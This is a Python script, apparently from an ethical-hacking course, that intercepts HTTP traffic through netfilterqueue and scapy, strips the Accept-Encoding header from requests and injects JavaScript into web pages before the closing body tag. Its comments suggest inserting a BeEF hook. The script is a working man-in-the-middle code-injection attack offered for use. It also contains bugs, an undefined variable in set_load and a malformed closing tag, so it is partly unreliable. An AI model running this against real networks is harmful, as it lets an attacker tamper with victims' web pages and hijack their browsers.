#!/usr/bin/env python
# raw http data(html) to modify instead of creating new response as in replace download script we gonna modify data send in raw layer
# program used for modifying html code ,inject js code in that webpage
# injecting js code allow you to use framework like beef.inject beef hook code in the response content. 
import scapy.all as scapy
import netfilterqueue
import re 
def set_load(packet,load):
    scapy_packet[scapy.Raw].load=load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].len
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet=scapy.IP(packet.get_payload())#1convert to scapy packet
    if scapy_packet.haslayer(scapy.Raw): 
        
        if scapy_packet[scapy.TCP].dport==80:#80 implies http port
            print("[+] HTTP request")
            # in request (accept-encoding:gzip,deflate) so the html send by server is converted and compressed to this form which is difficult to understand and change 
            # this compressed form is decoded by browser to html form
            # so change accept-encoding header so server sends the plane content(html,css,js,image).so remove that header then server think they dont understand compressed one so send as plane text html
            # use re for getting accept encoding part to remove
            modified_load=re.sub("Accept-Encoding:.*?\\r\\n","",scapy_packet[scapy.Raw].load)#sub implies substitute or replace "" emplies with nothing."Accept-Encoding:.*?\\r\\n" is re pattern to repalce with empty
            new_packet=set_load(scapy_packet,modified_load)
            packet.set_payload(str(new_packet))#change request packet removing accept encoding
            print(scapy_packet.show())#check request has been changed test in your sys no accept encoding field and response has plane content


        elif scapy_packet[scapy.TCP].sport==80:#80 implies http port
            print("[+] HTTP response")
            modified_load=scapy_packet[scapy.Raw].load.replace("</body>","<script>alert('hacked');</script></body")
            # replace is python function to replace content in paragraph we can even replace background img with our img etc
            
            new_packet=set_load(scapy_packet,modified_load)
            packet.set_payload(str(new_packet))
            
            print(scapy_packet.show())  
            # check for any website eg bing.com and get response with data(html) in hex form in raw label and load field
             
              
    packet.accept() 
queue=netfilterqueue.NetfilterQueue()#cerate object to interact with queue number 0 as specified as command in unix sys
queue.bind(0,process_packet) 
queue.run()